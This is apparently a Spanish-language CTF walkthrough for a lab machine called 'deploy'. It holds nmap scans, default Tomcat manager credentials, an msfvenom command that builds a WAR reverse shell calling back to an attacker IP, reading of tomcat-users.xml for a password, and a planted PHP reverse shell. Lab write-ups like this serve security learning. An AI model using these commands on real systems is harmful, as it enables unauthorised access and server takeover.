# Máquina deploy

### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 192.168.42.166

![alt text](image-1.png)

### Servicios y versiones 

sudo nmap -sV --script vuln -p22,80,8080 --min-rate 6000 -vvv 192.168.42.166

![alt text](image-2.png)

### Entramos en la web

![alt text](image-3.png)

### Explotación

Entramos en manager webapp

![alt text](image-4.png)

con las credenciales

tomcat:s3cret

en Kali generamos un reverseshell con msfvenom llamado reverse.war:

msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.42.133 LPORT=443 -f war -o reverse.war

![alt text](image-5.png)

lo subimos en:

![alt text](image-6.png)

nos ponemos en escucha con netcat en el puerto 443 y en la web le damos clic en :

![alt text](image-7.png)

![alt text](image-8.png)

vemos otros usuarios

![alt text](image-9.png)

analizamos el archivo: /etc/tomcat9/tomcat-users.xml

encontramos la contraseña de sa

![alt text](image-10.png)

nos conectamos por ssh con el usuario sa:

![alt text](image-11.png)

creamos un archivo reverse.php en /var/www/html con el código de pentestmonkey

![alt text](image-12.png)

nos ponemos en escucha con el puerto 4444

y accedemos a http://192.168.42.166/reverse.php

![alt text](image-13.png)

accedimos con el usuario toor

![alt text](image-14.png)

### Escalar privilegios

![alt text](image-15.png)

![alt text](image-17.png)

![alt text](image-16.png)

### user.txt

![alt text](image-18.png)

### root.txt

![alt text](image-19.png)

